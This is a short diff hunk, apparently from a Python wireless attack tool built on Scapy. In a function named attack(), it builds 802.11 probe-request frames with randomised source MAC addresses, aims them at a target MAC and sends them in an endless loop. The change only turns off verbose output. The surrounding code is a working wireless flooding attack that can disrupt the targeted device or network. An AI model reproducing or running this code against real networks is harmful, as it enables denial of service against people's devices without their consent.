@@ -14,7 +14,7 @@ def attack():
     randMAC = vendor + ':'.join(RandMAC().split(':')[3:])
     frame = RadioTap() / Dot11(addr1=Var.mac_to_attack, addr2=randMAC,
                                addr3=randMAC) / Dot11ProbeReq() / Dot11Elt(ID="SSID", info="")
-    sendp(frame, iface=Var.interface, loop=1, verbose=1)
+    sendp(frame, iface=Var.interface, loop=1, verbose=0)
 
 
 def attack_pro():
